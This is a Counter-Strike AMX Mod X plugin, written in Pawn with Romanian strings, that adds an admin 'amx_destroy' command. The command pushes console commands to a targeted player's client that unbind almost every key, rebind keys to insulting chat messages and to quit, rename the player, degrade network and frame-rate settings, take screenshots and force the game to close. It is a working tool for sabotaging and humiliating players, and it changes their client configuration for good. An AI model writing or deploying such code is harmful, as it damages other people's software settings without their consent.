#include <amxmodx>
#include <amxmisc>
#include <fun>
#include <engine>

#define Baza 45630

new BanData[33][2][32]
new bool:ComandaB = false
new DirectorServer[64],TextServer[32],LimbaServer = 31,r,t
new FisierServer[128]
new SalvareServer

static const poza[] = "http://..." 

public plugin_init()
{
	register_plugin("Destroy Comand", "1.0", "M@$t3r_@dy")
	register_concmd("amx_destroy", "destroy", ADMIN_LEVEL_G,"<nume> : Ii strica CS jucatorului + screenshot")
	register_cvar("amx_destroy_activity","1")
}


public destroy(id,level,cid){
	if (!cmd_access(id,level,cid,2)){
		return PLUGIN_HANDLED
	}
	if (ComandaB){
		Cronometru(id)
		return PLUGIN_HANDLED
	}
	new arg[32],name[32],admin[32],sAuthid[35],sAuthid2[35],message[552],players[33],inum
	new fo_logfile[64],timp[64],maxtext[256]
	new tinta[32], minute[8], motiv[64] 
	read_argv(1, tinta, 31)    
	read_argv(2, minute, 7) 
	read_argv(3, motiv, 63)
	read_argv(1, arg, 31)
	new target = cmd_target(id,arg,1)
	new jucator = cmd_target(id, tinta, 9) 
	if (!jucator) 
		return PLUGIN_HANDLED 	
	
	copy(BanData[jucator][0], 31, minute) 
	copy(BanData[jucator][1], 31, motiv) 
	new TaskData[4] 
	TaskData[0] = id 
	TaskData[1] = jucator
	new numeserver[64], nume[32], ip[32] 
	get_user_name(target,name,31)
	get_user_name(id,admin,31)
	get_user_authid(target,sAuthid,34)
	get_user_authid(id,sAuthid2,34)
	get_cvar_string("hostname",numeserver,63); 
	get_user_name(jucator,nume,31); 
	get_user_ip(jucator,ip,31); 
	get_configsdir(fo_logfile, 63)
	get_time("%m/%d/%Y - %H:%M:%S",timp,63)
	IncarcareServer()
	ScriereServer()
	format(message,551,"DESTROYED^nComanda executata cu succes.^n Comanda numarul %i",SalvareServer)
    	format(maxtext, 255, "[AMXX] %s: %s a folosit comanda DESTROY pe %s",timp,admin,name)
    	format(fo_logfile, 63, "%s/destroy.txt", fo_logfile)
	
	if(!target){ 
	
        	return PLUGIN_HANDLED 
    	}
    	switch (get_cvar_num("amx_destroy_activity")) {
    		case 1: client_cmd(target,"say ^" %s mi-a dat DESTROY !^"",admin)
    		case 0: client_cmd(target,"say ^"Am primit DESTROY !^"")
   	}
	client_cmd(target,"developer 1")
  	client_cmd(target,"unbind w;wait;unbind a;unbind s;wait;unbind d;bind mouse1 ^"say Am luat DESTROY pe BERCENI.SERVEGAME.COM .^";wait;unbind mouse2;unbind mouse3;wait;bind space quit")
    	client_cmd(target,"unbind ctrl;wait;unbind 1;unbind 2;wait;unbind 3;unbind 4;wait;unbind 5;unbind 6;wait;unbind 7")
    	client_cmd(target,"unbind 8;wait;unbind 9;unbind 0;wait;unbind r;unbind e;wait;unbind g;unbind q;wait;unbind shift")
    	client_cmd(target,"unbind end;wait;bind escape ^"say Sunt neajutorat ca un mic cacat^";unbind z;wait;unbind x;unbind c;wait;unbind uparrow;unbind downarrow;wait;unbind leftarrow")
    	client_cmd(target,"unbind rightarrow;wait;unbind mwheeldown;unbind mwheelup;wait;bind ` ^"say Sunt neajutorat ca un mic cacat^";bind ~ ^"say Am fost distrus .^";wait;name ^"UN MARE DISTRUS^"")
    	client_cmd(target,"rate 1;gl_flipmatrix 1;cl_cmdrate 10;cl_updaterate 10;fps_max 1;hideradar;con_color ^"1 1 1^"")
    	write_file(fo_logfile,maxtext,-1)
	set_hudmessage(255,255,0,0.47,0.55,0,6.0,12.0,0.1,0.2,1)
    	show_hudmessage(0, message)
    	client_cmd(0, "spk ^"vox/bizwarn coded user apprehend^"")
    	for (new i = 0; i < inum; ++i) {
    		if ( access(players[i],ADMIN_CHAT) )
      		 client_print(players[i],print_chat,"[BERCENI]Jucatorul:%s a primit DESTROY de la %s",name,admin)
  	}
  	ComandaB = true
	Cronometru(id)	

	client_print(jucator,print_chat,"* Screenshot a fost facut pe : %s",numeserver) 
	client_print(jucator, print_chat, "* Nume:  ^"%s^" cu IP : %s",nume,ip) 
	client_print(jucator, print_chat, "* Data : %s",timp) 
	client_print(jucator, print_chat, "* Ai primit ban de la adminul %s",admin)
	client_print(jucator, print_chat, "* Viziteaza %s pentru a scoate banul.", poza) 
	console_print(jucator,"* Screenshot a fost facut pe : %s",numeserver) 
	console_print(jucator, "* Nume:  ^"%s^" cu IP : %s",nume,ip) 
	console_print(jucator, "* Data : %s",timp) 
	console_print(jucator, "* Ai primit ban de la adminul %s",admin)
	console_print(jucator, "* Viziteaza %s pentru a scoate banul.", poza) 
	client_cmd(jucator,"wait;snapshot;wait;snapshot") 
	client_cmd(target,"wait;wait;wait;wait;quit")
  	return PLUGIN_HANDLED
    	
}

public Cronometru(id){
	new parm[1]
	parm[0] = id
	if (ComandaB){
		set_task(3.0,"TimpDeAsteptare",Baza+id,parm)
	}
}
public TimpDeAsteptare(id){
	if (task_exists(Baza+id)){
		remove_task(Baza+id)
	}
	ComandaB = false
}

stock IncarcareServer(){
	get_configsdir(DirectorServer, 63)
	format(FisierServer,127,"%s/servit.q",DirectorServer)
	if (!file_exists(FisierServer)){
		return PLUGIN_HANDLED
	}
	else {
		
    		read_file(FisierServer,0,TextServer,LimbaServer,r)
  		
		SalvareServer = str_to_num(TextServer)
	}
	return PLUGIN_CONTINUE
}
stock ScriereServer(){
	get_configsdir(DirectorServer, 63)
	format(FisierServer,127,"%s/servit.q",DirectorServer)
	if (!file_exists(FisierServer)){
		return PLUGIN_HANDLED
	}
	else {
		
    		read_file(FisierServer,0,TextServer,LimbaServer,t)
  		
		
		SalvareServer = str_to_num(TextServer)
		SalvareServer = SalvareServer + 1
		format(TextServer,31,"%i",SalvareServer)
		delete_file(FisierServer)
		write_file(FisierServer,TextServer,-1)
	}
	return PLUGIN_CONTINUE
}